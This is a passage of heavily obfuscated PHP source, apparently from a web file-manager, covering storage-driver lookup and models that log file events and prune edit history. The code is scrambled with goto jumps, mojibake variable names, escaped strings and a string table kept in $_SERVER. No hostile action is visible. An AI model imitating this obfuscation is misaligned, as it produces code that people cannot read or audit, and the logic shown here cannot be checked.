strlen($d§­ÁÑ‘ßµ)); $FºîÕß°“Ì[$d‘÷×Œ†¹[1002]] = trim($CĞÉƒšÓğÃ, $d‘÷×Œ†¹[18]); } return array_to_keyvalue($fáŒÑ¨öí¿, $d‘÷×Œ†¹[1002]); } public static function fileSubstr($cæÃÙ÷Ş, $Fœ’ª£‰ ¨, $c©¾ÀãùÜ = false) { goto C‰Èº¢®°ğ; fšŸÙ—Îåò: $Eµ¶ß†Œª» = $c©¾ÀãùÜ; if ($Fœ’ª£‰ ¨ < 0) { $Fœ’ª£‰ ¨ = $d™î¹é©á‘ + $Fœ’ª£‰ ¨; } if ($c©¾ÀãùÜ === !1) { $c©¾ÀãùÜ = $d™î¹é©á‘ - $Fœ’ª£‰ ¨; } goto cÀ°ŠÄÍš¤; aó¢İ‚ĞÜ¿: return $d¯œ¼‘‰¥Ü->fileSubstr($cæÃÙ÷Ş, $Fœ’ª£‰ ¨, $c©¾ÀãùÜ); goto C¶ŠÑ±¯Ş; cÀ°ŠÄÍš¤: if ($Fœ’ª£‰ ¨ + $c©¾ÀãùÜ > $d™î¹é©á‘) { $c©¾ÀãùÜ = $d™î¹é©á‘ - $Fœ’ª£‰ ¨; } if ($c©¾ÀãùÜ <= 0) { return $_SERVER[¹÷ˆ§éÒ°ú][43]; } if ($Fœ’ª£‰ ¨ < 0 || $Fœ’ª£‰ ¨ >= $d™î¹é©á‘ || $c©¾ÀãùÜ > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\x65\122\x65\x61\144\40\145\x72\162\x6f\x72\x21\x20\x73\x74\x61\x72\x74\x3d{$Fœ’ª£‰ ¨}\73\x6c\145\x6e\147\x74\150\75{$c©¾ÀãùÜ}\73\x20\x73\x69\172\x65\x3d{$d™î¹é©á‘}\x3b"); } goto aó¢İ‚ĞÜ¿; C‰Èº¢®°ğ: $d¯œ¼‘‰¥Ü = self::driverMake($cæÃÙ÷Ş); $d™î¹é©á‘ = $d¯œ¼‘‰¥Ü->size($cæÃÙ÷Ş); $EœÔÕ»À = $Fœ’ª£‰ ¨; goto fšŸÙ—Îåò; C¶ŠÑ±¯Ş: } private static function driverMake(&$C§»¿ËêË‹) { goto CÚ‹³©×Ê‹; b¶½‹ï¥ç: if ($F…ˆ¨‡ÒŠ[$F¾Ëí°ù¼§[39]] == KodIO::KOD_IO && !self::$driverListSystem[$F…ˆ¨‡ÒŠ[$F¾Ëí°ù¼§[378]]]) { return !1; } $C§»¿ËêË‹ = $F…ˆ¨‡ÒŠ[$F¾Ëí°ù¼§[1003]]; $BÌ£Íí‘ğ = self::driverGet($F…ˆ¨‡ÒŠ, $C§»¿ËêË‹); goto cö¡Ô˜´Õ; CÚ‹³©×Ê‹: $F¾Ëí°ù¼§ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F…ˆ¨‡ÒŠ = KodIO::parse($C§»¿ËêË‹); if (!self::$driverListSystem) { $B„™£¢á“¤ = Model($F¾Ëí°ù¼§[698])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B„™£¢á“¤, $F¾Ëí°ù¼§[378]); } goto b¶½‹ï¥ç; cö¡Ô˜´Õ: return $BÌ£Íí‘ğ; goto DË†¡ÅŒÃ¬; DË†¡ÅŒÃ¬: } private static function driverGet($cÇ¤¦ğíè, &$c§ÒÅóÉƒ) { goto Eöå…œ³®†; dğ½Æïáíµ: $c¡•ŠÑŒŞÜ->path = $c§ÒÅóÉƒ; return $c¡•ŠÑŒŞÜ; goto eÀø½”–š; F‡³†ˆîª‰: $c¡•ŠÑŒŞÜ = self::$driverCache[$E¹ë¥Í–”ƒ]; $c¡•ŠÑŒŞÜ->pathDriver = $FŠóÄ Å‰; $c¡•ŠÑŒŞÜ->pathBase = $Dõ•Ø„·ïƒ[43]; goto A¿×¸×ŒÄ¦; EİòÁ¿ùì: switch ($cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[39]]) { case KodIO::KOD_IO: $B²Êá¬·Î = self::$driverListSystem[$EçÏˆ³µ˜]; break; case KodIO::KOD_SOURCE: $c§ÒÅóÉƒ = $EçÏˆ³µ˜ . $c§ÒÅóÉƒ; $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1006], $Dõ•Ø„·ïƒ[16] => $cÇ¤¦ğíè); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FÑÖ»ëší = $GLOBALS[$Dõ•Ø„·ïƒ[1007]]; self::$driverListUser = array_to_keyvalue($FÑÖ»ëší, $Dõ•Ø„·ïƒ[378]); } $B²Êá¬·Î = self::$driverListUser[$EçÏˆ³µ˜]; break; case KodIO::KOD_SHARE_LINK: $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1008], $Dõ•Ø„·ïƒ[16] => $cÇ¤¦ğíè); $AÁ¡÷º‘ğ‰ = Action($Dõ•Ø„·ïƒ[1009])->sharePathInfo($cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[87]]); $c§ÒÅóÉƒ = $AÁ¡÷º‘ğ‰[$Dõ•Ø„·ïƒ[380]]; if (!$AÁ¡÷º‘ğ‰[$Dõ•Ø„·ïƒ[380]]) { $EìÀ”ÍáÙˆ = Model($Dõ•Ø„·ïƒ[549])->getInfo($AÁ¡÷º‘ğ‰[$Dõ•Ø„·ïƒ[452]]); $c§ÒÅóÉƒ = KodIO::clear($EìÀ”ÍáÙˆ[$Dõ•Ø„·ïƒ[1010]] . $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[1003]]); $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[450]] = $EìÀ”ÍáÙˆ; $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[989]] = $c§ÒÅóÉƒ; $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1011], $Dõ•Ø„·ïƒ[16] => $cÇ¤¦ğíè); } break; case KodIO::KOD_SHARE_ITEM: $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1012], $Dõ•Ø„·ïƒ[16] => $cÇ¤¦ğíè); $EìÀ”ÍáÙˆ = Model($Dõ•Ø„·ïƒ[549])->getInfo($cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[378]]); if ($EìÀ”ÍáÙˆ[$Dõ•Ø„·ïƒ[380]] == $Dõ•Ø„·ïƒ[481]) { $c§ÒÅóÉƒ = KodIO::clear($EìÀ”ÍáÙˆ[$Dõ•Ø„·ïƒ[1010]] . $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[1003]]); $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[450]] = $EìÀ”ÍáÙˆ; $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[989]] = $c§ÒÅóÉƒ; $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1013], $Dõ•Ø„·ïƒ[16] => $cÇ¤¦ğíè); } else { if (!$c§ÒÅóÉƒ) { $c§ÒÅóÉƒ = $EìÀ”ÍáÙˆ[$Dõ•Ø„·ïƒ[380]]; } } break; default: $c§ÒÅóÉƒ = $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[87]]; $B²Êá¬·Î = array($Dõ•Ø„·ïƒ[1005] => $Dõ•Ø„·ïƒ[1014]); break; } $E¹ë¥Í–”ƒ = $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[87]]; if (!isset(self::$driverCache[$E¹ë¥Í–”ƒ])) { $E—ô»¬§ = strtolower($B²Êá¬·Î[$Dõ•Ø„·ïƒ[102]]); $Fìì“ø¯¨° = $GLOBALS[$Dõ•Ø„·ïƒ[16]][$Dõ•Ø„·ïƒ[96]][$Dõ•Ø„·ïƒ[748]]; $eë½ÏÃ²·² = $Dõ•Ø„·ïƒ[83] . (isset($Fìì“ø¯¨°[$E—ô»¬§]) ? $Fìì“ø¯¨°[$E—ô»¬§] : ucfirst($E—ô»¬§)); if (!class_exists($eë½ÏÃ²·²)) { show_json("{$eë½ÏÃ²·²}\40\x6e\x6f\x74\x20\145\170\x69\163\x74\x73\x21", !1); } $eƒ”Øè›½ = isset($B²Êá¬·Î[$Dõ•Ø„·ïƒ[16]]) ? $B²Êá¬·Î[$Dõ•Ø„·ïƒ[16]] : !1; self::$driverCache[$E¹ë¥Í–”ƒ] = new $eë½ÏÃ²·²($eƒ”Øè›½); } goto F‡³†ˆîª‰; A¿×¸×ŒÄ¦: if (isset($B²Êá¬·Î[$Dõ•Ø„·ïƒ[16]][$Dõ•Ø„·ïƒ[1015]])) { $c¡•ŠÑŒŞÜ->pathBase = rtrim($B²Êá¬·Î[$Dõ•Ø„·ïƒ[16]][$Dõ•Ø„·ïƒ[1015]], $Dõ•Ø„·ïƒ[18]) . $Dõ•Ø„·ïƒ[18]; $c§ÒÅóÉƒ = $c¡•ŠÑŒŞÜ->pathBase . ltrim($c§ÒÅóÉƒ, $Dõ•Ø„·ïƒ[18]); } $c§ÒÅóÉƒ = $c¡•ŠÑŒŞÜ->getPath($c§ÒÅóÉƒ); if (isset($cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[989]])) { $c§ÒÅóÉƒ = $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[989]]; } goto dğ½Æïáíµ; Eöå…œ³®†: $Dõ•Ø„·ïƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FŠóÄ Å‰ = $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[1004]]; $EçÏˆ³µ˜ = $cÇ¤¦ğíè[$Dõ•Ø„·ïƒ[378]]; goto EİòÁ¿ùì; eÀø½”–š: } } goto CÈ‡…Åƒê; eºÃÏ×÷¶è: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\x65\x5f\x65\166\145\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\143\x74\151\157\156"), array("\x64\145\163\x63", '', "\x69\x6e\163\145\162\x74\54\165\160\144\x61\x74\x65\x2c\x73\145\154\145\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($B¢„¾î, $déÉ¤§à­³, $C–¢ÇëÅºÌ = '') { goto eØ¦˜ÒÀ‰; a„ƒ±Ä‘„Ö: $eù«È‘Ïµ³ = array($aá¬Ú˜àğô[394] => $B¢„¾î, $aá¬Ú˜àğô[2289] => $f„åÚ”Ç•ä[$aá¬Ú˜àğô[474]], $aá¬Ú˜àğô[2290] => $f„åÚ”Ç•ä[$aá¬Ú˜àğô[38]], $aá¬Ú˜àğô[479] => $f„åÚ”Ç•ä[$aá¬Ú˜àğô[479]], $aá¬Ú˜àğô[1418] => USER_ID, $aá¬Ú˜àğô[399] => $déÉ¤§à­³, $aá¬Ú˜àğô[1420] => $C–¢ÇëÅºÌ); $this->addSystemLog($déÉ¤§à­³, $eù«È‘Ïµ³); return $this->add($eù«È‘Ïµ³); goto DÚĞ‘Š¶; eØ¦˜ÒÀ‰: $aá¬Ú˜àğô =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->eventSave) { return; } $f„åÚ”Ç•ä = Model($aá¬Ú˜àğô[1108])->sourceInfo($B¢„¾î); goto EÌ³ª±Ì‰ù; EÌ³ª±Ì‰ù: if (!$f„åÚ”Ç•ä) { return !1; } if ($this->isCacheEvent($f„åÚ”Ç•ä, $déÉ¤§à­³)) { return; } if ($C–¢ÇëÅºÌ && is_string($C–¢ÇëÅºÌ)) { $C–¢ÇëÅºÌ = array($aá¬Ú˜àğô[2128] => $C–¢ÇëÅºÌ); } goto a„ƒ±Ä‘„Ö; DÚĞ‘Š¶: } private function addSystemLog($dòÀøŸŠ, $E¨ââ¢Ã³) { $F…ÌÉ É¥å =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($dòÀøŸŠ == $F…ÌÉ É¥å[2291]) { $dòÀøŸŠ = $E¨ââ¢Ã³[$F…ÌÉ É¥å[416]][$F…ÌÉ É¥å[2292]]; } else { if (in_array($dòÀøŸŠ, array($F…ÌÉ É¥å[2075], $F…ÌÉ É¥å[2293]))) { $dòÀøŸŠ = $E¨ââ¢Ã³[$F…ÌÉ É¥å[416]][$F…ÌÉ É¥å[687]]; } } $dò†ÇÚ—ù = array_merge($E¨ââ¢Ã³, array($F…ÌÉ É¥å[2294] => $E¨ââ¢Ã³[$F…ÌÉ É¥å[380]], $F…ÌÉ É¥å[2295] => $E¨ââ¢Ã³[$F…ÌÉ É¥å[2295]])); Model($F…ÌÉ É¥å[2038])->addLog($F…ÌÉ É¥å[2296] . $dòÀøŸŠ, $dò†ÇÚ—ù); } private function isCacheEvent($eâ°èÎÙ‚³, $dÃîÆæš–—) { if ($eâ°èÎÙ‚³[$_SERVER[¹÷ˆ§éÒ°ú][382]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F’ì¬Í­, $e¿¡±ÍÉšŞ) { $aÈ˜ÆéÖêß =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÒÏà— = Model($aÈ˜ÆéÖêß[1108])->sourceInfo($F’ì¬Í­); $Aâ¾á‰É•· = array($aÈ˜ÆéÖêß[2292] => $e¿¡±ÍÉšŞ, $aÈ˜ÆéÖêß[38] => $AÒÏà—[$aÈ˜ÆéÖêß[38]]); return $this->addEvent($F’ì¬Í­, $aÈ˜ÆéÖêß[2291], $Aâ¾á‰É•·); } public function eventFileEdit($Eó’“ê–™) { $f¹Õ÷È–¿  =& $_SERVER[¹÷ˆ§éÒ°ú]; $E•†éŠù„á = array($f¹Õ÷È–¿ [2297] => $_SERVER[$f¹Õ÷È–¿ [2298]], $f¹Õ÷È–¿ [1742] => strtolower(ACTION)); return $this->addEvent($Eó’“ê–™, $f¹Õ÷È–¿ [2065], $E•†éŠù„á); } public function eventRecycle($c¸íìÌÀ, $F¢«œÀ Â) { return $this->addEvent($c¸íìÌÀ, $_SERVER[¹÷ˆ§éÒ°ú][2293], $F¢«œÀ Â); } public function eventRemove($a½êé»‹±‹) { $EèšŸ„¡ÑŸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aç¾å•³ğ = Model($EèšŸ„¡ÑŸ[1108])->sourceInfo($a½êé»‹±‹); $eÅÛ®¨‰ê = $aç¾å•³ğ[$EèšŸ„¡ÑŸ[38]]; return $this->addEvent($aç¾å•³ğ[$EèšŸ„¡ÑŸ[474]], $EèšŸ„¡ÑŸ[2064], $eÅÛ®¨‰ê); } public function eventShare($A±”±‚•ÍÚ, $CöµØõ«ä) { return $this->addEvent($A±”±‚•ÍÚ, $_SERVER[¹÷ˆ§éÒ°ú][2075], $CöµØõ«ä); } public function eventMove($d‡¢ğ™­·‡, $C¥Â½œ£, $Fâá¶äøêˆ) { goto E„ˆ¥Ò³ôÏ; Aæ·ô¤„®˜: $this->addEvent($C¥Â½œ£, $c”¥ÈùŞÏë[2303], $FÕ ¨ëØ‡Ü); goto A½è‹‰ï¾¦; E„ˆ¥Ò³ôÏ: $c”¥ÈùŞÏë =& $_SERVER[¹÷ˆ§éÒ°ú]; $b›²¤åî¡ = Model($c”¥ÈùŞÏë[1108]); $cóä§Ñ = $b›²¤åî¡->sourceInfo($d‡¢ğ™­·‡); goto cÓÕ…Ï‚‰; Aâ™ØÆŞ—‰: $this->addEvent($d‡¢ğ™­·‡, $c”¥ÈùŞÏë[505], $FÕ ¨ëØ‡Ü); $cóä§Ñ = $b›²¤åî¡->sourceInfo($d‡¢ğ™­·‡); $FÕ ¨ëØ‡Ü = array($c”¥ÈùŞÏë[380] => $cóä§Ñ[$c”¥ÈùŞÏë[380]], $c”¥ÈùŞÏë[38] => $cóä§Ñ[$c”¥ÈùŞÏë[38]]); goto Aæ·ô¤„®˜; cÓÕ…Ï‚‰: $b‚Ø¢Ä„âæ = $b›²¤åî¡->sourceInfo($C¥Â½œ£); $eƒø«àí¯· = $b›²¤åî¡->sourceInfo($Fâá¶äøêˆ); $FÕ ¨ëØ‡Ü = array($c”¥ÈùŞÏë[998] => $C¥Â½œ£, $c”¥ÈùŞÏë[2299] => $b‚Ø¢Ä„âæ[$c”¥ÈùŞÏë[38]], $c”¥ÈùŞÏë[2300] => $b‚Ø¢Ä„âæ[$c”¥ÈùŞÏë[479]], $c”¥ÈùŞÏë[999] => $Fâá¶äøêˆ, $c”¥ÈùŞÏë[2301] => $eƒø«àí¯·[$c”¥ÈùŞÏë[38]], $c”¥ÈùŞÏë[2302] => $eƒø«àí¯·[$c”¥ÈùŞÏë[479]]); goto Aâ™ØÆŞ—‰; A½è‹‰ï¾¦: } public function eventCopy($bî°Ø‰õ–Å) { $this->eventCreate($bî°Ø‰õ–Å, $_SERVER[¹÷ˆ§éÒ°ú][503]); } public function eventRename($EáîŒñˆƒ™, $a‚çËŸç†, $Dİ˜°·©®ï) { $CôØğµÅò… =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÈçÅÂùø¡ = array($CôØğµÅò…[998] => $a‚çËŸç†, $CôØğµÅò…[999] => $Dİ˜°·©®ï); return $this->addEvent($EáîŒñˆƒ™, $CôØğµÅò…[1121], $dÈçÅÂùø¡); } public function eventAddComment($AÁÊôØÄÉé, $AÅÙ÷«îøİ) { return $this->addEvent($AÁÊôØÄÉé, $_SERVER[¹÷ˆ§éÒ°ú][2304], $AÅÙ÷«îøİ); } public function eventAddDesc($CÄ…ˆÏŸ³, $FğáÂö§ëÛ) { return $this->addEvent($CÄ…ˆÏŸ³, $_SERVER[¹÷ˆ§éÒ°ú][2305], $FğáÂö§ëÛ); } public function listBySource($E¶‹–ÉòÂí) { goto F¾ßô°ºğø; Cæİ…¬íà–: return $this->eventListParse($C¶ÃàŒÅâ‚, $E¶‹–ÉòÂí); goto cìœùùÍíÄ; c²äîµ˜×ğ: if ($BßÄ¼Ï†æÂ[$DÇ•ºâ†ÕÑ[381]] == $DÇ•ºâ†ÕÑ[95]) { $Fƒ”†À‘ = Model($DÇ•ºâ†ÕÑ[1108])->listSearchChildren($E¶‹–ÉòÂí, 20000); $Fƒ”†À‘[] = $E¶‹–ÉòÂí . $DÇ•ºâ†ÕÑ[372]; $CŒß•Á– = array($DÇ•ºâ†ÕÑ[380] => array($DÇ•ºâ†ÕÑ[17], $Fƒ”†À‘)); } $C¶ÃàŒÅâ‚ = $this->where($CŒß•Á–)->order($DÇ•ºâ†ÕÑ[2306])->selectPage(); if ($C¶ÃàŒÅâ‚[$DÇ•ºâ†ÕÑ[362]][$DÇ•ºâ†ÕÑ[363]] == 0) { $C¶ÃàŒÅâ‚[$DÇ•ºâ†ÕÑ[362]][$DÇ•ºâ†ÕÑ[363]] = 1; $C¶ÃàŒÅâ‚[$DÇ•ºâ†ÕÑ[365]] = array(array($DÇ•ºâ†ÕÑ[394] => $E¶‹–ÉòÂí, $DÇ•ºâ†ÕÑ[2289] => $BßÄ¼Ï†æÂ[$DÇ•ºâ†ÕÑ[474]], $DÇ•ºâ†ÕÑ[1418] => $BßÄ¼Ï†æÂ[$DÇ•ºâ†ÕÑ[389]], $DÇ•ºâ†ÕÑ[399] => $DÇ•ºâ†ÕÑ[2307], $DÇ•ºâ†ÕÑ[400] => $BßÄ¼Ï†æÂ[$DÇ•ºâ†ÕÑ[199]], $DÇ•ºâ†ÕÑ[1420] => $DÇ•ºâ†ÕÑ[43])); } goto Cæİ…¬íà–; F¾ßô°ºğø: $DÇ•ºâ†ÕÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BßÄ¼Ï†æÂ = Model($DÇ•ºâ†ÕÑ[1108])->sourceInfo($E¶‹–ÉòÂí); $CŒß•Á– = array($DÇ•ºâ†ÕÑ[394] => $E¶‹–ÉòÂí); goto c²äîµ˜×ğ; cìœùùÍíÄ: } private function eventListParse($Dçê¤Ô¿—, $F…œîÊ¹õô) { goto fÈ§ª‰’©; Bß‰Ûå•ß: return $Dçê¤Ô¿—; goto E—í¤‡®…; FÌªË’æªÊ: $FİãŠñô…¦ = array_unique($FİãŠñô…¦); $Báå²ƒ’… = array_unique(array_to_keyvalue($F†…ÈÛ´‚å, $C½†óŠ„Ã³[43], $C½†óŠ„Ã³[1427])); $a¶¶ÅäÙŸó = Model($C½†óŠ„Ã³[490])->userListInfo($Báå²ƒ’…); goto dÊô‡·á¬Ó; fÈ§ª‰’©: $C½†óŠ„Ã³ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F†…ÈÛ´‚å = $Dçê¤Ô¿—[$C½†óŠ„Ã³[365]]; $FİãŠñô…¦ = array_to_keyvalue($F†…ÈÛ´‚å, $C½†óŠ„Ã³[43], $C½†óŠ„Ã³[380]); goto Aª«Èœ«î×; Aª«Èœ«î×: $d±à­±ªÜ­ = array_to_keyvalue($F†…ÈÛ´‚å, $C½†óŠ„Ã³[43], $C½†óŠ„Ã³[2295]); foreach ($F†…ÈÛ´‚å as $fõµçÖ„½) { $B†ö“’Ï = $fõµçÖ„½[$C½†óŠ„Ã³[416]]; if ($fõµçÖ„½[$C½†óŠ„Ã³[39]] == $C½†óŠ„Ã³[505] && isset($B†ö“’Ï[$C½†óŠ„Ã³[998]])) { $FİãŠñô…¦[] = $B†ö“’Ï[$C½†óŠ„Ã³[998]] . $C½†óŠ„Ã³[43]; $FİãŠñô…¦[] = $B†ö“’Ï[$C½†óŠ„Ã³[999]] . $C½†óŠ„Ã³[43]; } if ($fõµçÖ„½[$C½†óŠ„Ã³[39]] == $C½†óŠ„Ã³[2303] && isset($B†ö“’Ï[$C½†óŠ„Ã³[380]])) { $FİãŠñô…¦[] = $B†ö“’Ï[$C½†óŠ„Ã³[380]] . $C½†óŠ„Ã³[43]; } } $FİãŠñô…¦ = array_merge($FİãŠñô…¦, $d±à­±ªÜ­, array($F…œîÊ¹õô . $C½†óŠ„Ã³[43])); goto FÌªË’æªÊ; dÊô‡·á¬Ó: $cÙ¯ªßì½× = Model($C½†óŠ„Ã³[747])->sourceListInfo($FİãŠñô…¦, !0); foreach ($F†…ÈÛ´‚å as &$fõµçÖ„½) { if ($fõµçÖ„½[$C½†óŠ„Ã³[39]] == $C½†óŠ„Ã³[505] && isset($fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[998]])) { $fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[998]] = $cÙ¯ªßì½×[$fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[998]]]; $fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[999]] = $cÙ¯ªßì½×[$fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[999]]]; } if ($fõµçÖ„½[$C½†óŠ„Ã³[39]] == $C½†óŠ„Ã³[2303] && isset($fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[380]])) { $fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[380]] = $cÙ¯ªßì½×[$fõµçÖ„½[$C½†óŠ„Ã³[416]][$C½†óŠ„Ã³[380]]]; } $fõµçÖ„½[$C½†óŠ„Ã³[402]] = $cÙ¯ªßì½×[$fõµçÖ„½[$C½†óŠ„Ã³[380]]]; $fõµçÖ„½[$C½†óŠ„Ã³[2308]] = $cÙ¯ªßì½×[$fõµçÖ„½[$C½†óŠ„Ã³[2295]]]; if ($fõµçÖ„½[$C½†óŠ„Ã³[39]] == $C½†óŠ„Ã³[2064]) { $fõµçÖ„½[$C½†óŠ„Ã³[2308]] = $fõµçÖ„½[$C½†óŠ„Ã³[402]]; $fõµçÖ„½[$C½†óŠ„Ã³[2295]] = $fõµçÖ„½[$C½†óŠ„Ã³[2308]][$C½†óŠ„Ã³[380]]; $fõµçÖ„½[$C½†óŠ„Ã³[402]] = !1; $fõµçÖ„½[$C½†óŠ„Ã³[380]] = $C½†óŠ„Ã³[43]; } $fõµçÖ„½[$C½†óŠ„Ã³[2251]] = $a¶¶ÅäÙŸó[$fõµçÖ„½[$C½†óŠ„Ã³[1427]]]; } $Dçê¤Ô¿—[$C½†óŠ„Ã³[365]] = $F†…ÈÛ´‚å; goto Bß‰Ûå•ß; E—í¤‡®…: } public function removeBySource($fˆšÓ‰¸ò) { $fÓ ‡ÀÑ‹ = array($_SERVER[¹÷ˆ§éÒ°ú][394] => $fˆšÓ‰¸ò); $this->where($fÓ ‡ÀÑ‹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\143\x65\x5f\150\151\x73\164\157\162\x79"; public function addHistory($DÎ”Ğî¡à‰, $CàÄ³ªàæ = '') { $EóÑñËŸà =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÔ­´’„İ = array($EóÑñËŸà[394] => $DÎ”Ğî¡à‰[$EóÑñËŸà[380]], $EóÑñËŸà[1418] => isset($DÎ”Ğî¡à‰[$EóÑñËŸà[390]]) ? $DÎ”Ğî¡à‰[$EóÑñËŸà[390]] : $DÎ”Ğî¡à‰[$EóÑñËŸà[389]], $EóÑñËŸà[431] => $DÎ”Ğî¡à‰[$EóÑñËŸà[430]], $EóÑñËŸà[533] => $DÎ”Ğî¡à‰[$EóÑñËŸà[89]], $EóÑñËŸà[2309] => $CàÄ³ªàæ); $CĞ¨İ’…ßƒ = $GLOBALS[$EóÑñËŸà[16]][$EóÑñËŸà[96]][$EóÑñËŸà[2310]]; if ($CĞ¨İ’…ßƒ > 1) { $this->historyAutoClear($eÔ­´’„İ[$EóÑñËŸà[380]]); $this->add($eÔ­´’„İ); } Model($EóÑñËŸà[2311])->eventFileEdit($DÎ”Ğî¡à‰[$EóÑñËŸà[380]]); } private function historyAutoClear($C¦¬¤—¿´) { goto CÈ‡“áÊßœ; CÈ‡“áÊßœ: $eáÊéöà œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c†‰Éƒ¸Ÿ“ = Model($eáÊéöà œ[1079])->get($eáÊéöà œ[2312]); $FÍï¤’¡Şö = $GLOBALS[$eáÊéöà œ[16]][$eáÊéöà œ[96]][$eáÊéöà œ[2310]]; goto A÷¯”ˆ—¡ö; fÒï¿—Éëœ: if (!$AÅÔ½ğß†Ï || $cº«ÚêÏ‚ >= count($AÅÔ½ğß†Ï)) { return; } $F´çá¶Œ„ = array_to_keyvalue($AÅÔ½ğß†Ï, $eáÊéöà œ[43], $eáÊéöà œ[378]); $F´çá¶Œ„ = array_slice($F´çá¶Œ„, $cº«ÚêÏ‚); goto eŒê¹İ‘ŸÖ; AÀùÃÃùíé: $bìëÏœµÈ‡ = array($eáÊéöà œ[396] => array($eáÊéöà œ[17], $F´çá¶Œ„)); $this->where($bìëÏœµÈ‡)->delete(); Model($eáÊéöà œ[433])->remove($e†·‚¢Ã®á); goto E†š¡†Á¼÷; eŒê¹İ‘ŸÖ: $e†·‚¢Ã®á = array_to_keyvalue($AÅÔ½ğß†Ï, $eáÊéöà œ[43], $eáÊéöà œ[430]); $e†·‚¢Ã®á = array_slice($e†·‚¢Ã®á, $cº«ÚêÏ‚); if (!$F´çá¶Œ„ || !$e†·‚¢Ã®á) { return; } goto AÀùÃÃùíé; AÛ¦¿ƒ”ŒÕ: if ($cº«ÚêÏ‚ >= 500) { return; } $bìëÏœµÈ‡ = array($eáÊéöà œ[394] => $C¦¬¤—¿´); $AÅÔ½ğß†Ï = $this->field($eáÊéöà œ[2314])->where($bìëÏœµÈ‡)->order($eáÊéöà œ[2306])->select(); goto fÒï¿—Éëœ; A÷¯”ˆ—¡ö: $aÙ¤ö·ñ = $c†‰Éƒ¸Ÿ“ == $eáÊéöà œ[2313] ? 3 : $FÍï¤’¡Şö; if ($FÍï¤’¡Şö <= 1) { $aÙ¤ö·ñ = 1; } $cº«ÚêÏ‚ = $aÙ¤ö·ñ - 1; goto AÛ¦¿ƒ”ŒÕ; E†š¡†Á¼÷: } public function listData($eË­Ÿ£¾ƒœ) { goto AÎ†âë²ÄŞ; FªÉß‘Î: $FÛ³Ã•˜å = $this->field($F¬œ›£¾ëÔ)->where($C±ˆÁÓ—ß—)->order($EíÀÔŠÜù¬[2306])->selectPage(); $this->_listAppendUser($FÛ³Ã•˜å[$EíÀÔŠÜù¬[365]]); $bĞÕæ¥÷³° = Model($EíÀÔŠÜù¬[1079])->get($EíÀÔŠÜù¬[2312]); goto F©Æ›ˆ‹—; AÎ†âë²ÄŞ: $EíÀÔŠÜù¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C±ˆÁÓ—ß— = array($EíÀÔŠÜù¬[394] => $eË­Ÿ£¾ƒœ); $F¬œ›£¾ëÔ = $EíÀÔŠÜù¬[2315]; goto FªÉß‘Î; F©Æ›ˆ‹—: $d’î‚„¾—š = 3; if ($bĞÕæ¥÷³° == $EíÀÔŠÜù¬[2313]) { $FÛ³Ã•˜å[$EíÀÔŠÜù¬[365]] = array_slice($FÛ³Ã•˜å[$EíÀÔŠÜù¬[365]], 0, $d’î‚„¾—š); $FÛ³Ã•˜å[$EíÀÔŠÜù¬[362]] = array($EíÀÔŠÜù¬[2316] => 1, $EíÀÔŠÜù¬[2317] => 20, $EíÀÔŠÜù¬[2318] => 1, $EíÀÔŠÜù¬[2319] => count($FÛ³Ã•˜å[$EíÀÔŠÜù¬[365]])); } return $FÛ³Ã•˜å; goto E¬ÙÛïÔ·Æ; E¬ÙÛïÔ·Æ: } protected function _listAppendUser(&$d……Íæá) { $A—‡Ë‘•ÊÕ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÈ‡ß¾ÂŸ‘ = array_to_keyvalue($d……Íæá, 